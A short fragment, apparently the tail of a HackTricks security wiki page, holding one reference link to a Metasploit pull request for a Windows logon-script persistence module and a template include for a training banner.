- [7] [Metasploit PR #21032 – windows/persistence/userinit_mpr_logon_script](https://github.com/rapid7/metasploit-framework/pull/21032)
{{#include ../../banners/hacktricks-training.md}}
